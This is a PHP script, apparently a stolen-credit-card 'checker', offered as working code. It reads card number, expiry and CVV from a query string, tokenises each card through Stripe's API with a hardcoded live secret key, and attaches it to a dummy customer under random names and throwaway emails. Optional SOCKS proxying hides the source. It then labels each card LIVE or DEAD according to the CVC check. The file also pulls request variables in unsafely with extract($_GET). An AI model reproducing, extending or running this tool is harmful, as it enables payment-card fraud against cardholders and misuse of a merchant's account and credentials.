<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function RandomString($length = 23) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@olxbg.cf';
}
extract($_GET);
$check = str_replace(" " , "", $check);
$i = explode("|", $check);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");
fwrite(fopen('cookie.txt', 'w'), "");
$name = RandomString();
$lastname = RandomString();

$pub = 'pk_live_E0M8014cALnySBMlZSj44duj';
$sec= 'sk_live_SBevi1zyq8ggx14knjDBsTFU';

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
if($prtype=="socks4"){
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
}elseif($prtype=="socks5"){
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
}
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$d = curl_exec($ch);
$s = json_decode($d, true);
curl_close($ch);
if(isset($s["id"])){
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "description=Faith Auth&source=".$s["id"]);
curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$cus = json_decode(curl_exec($ch), true);
curl_close($ch);
$err = '[Message] '.$cus["error"]["message"].' [D-Code] '.$cus["error"]["decline_code"];
if($cus["card"]["cvc_check"]=="pass" && isset($cus["id"])){
  echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$check.'</td><td><span class="badge badge-success">Card Approved and cvc check passed</span></td><td>'.$s["client_ip"].'</td></tr>';
}elseif(!$cus["card"]["cvc_check"]=="fail" && isset($cus["id"])){
  echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$check.'</td><td><span class="badge badge-warning">Card Approved cvv check failed</span></td><td>'.$s["client_ip"].'</td></tr>';
}else{
  echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$check.'</td><td><span class="badge badge-danger">'.$err.'</span></td><td>'.$s["client_ip"].'</td></tr>';
}
}else{
  echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$check.'</td><td><span class="badge badge-danger">[Messsage] Charging went to an unexpected eror!</span></td><td>'.$s["client_ip"].'</td></tr>';

}
?>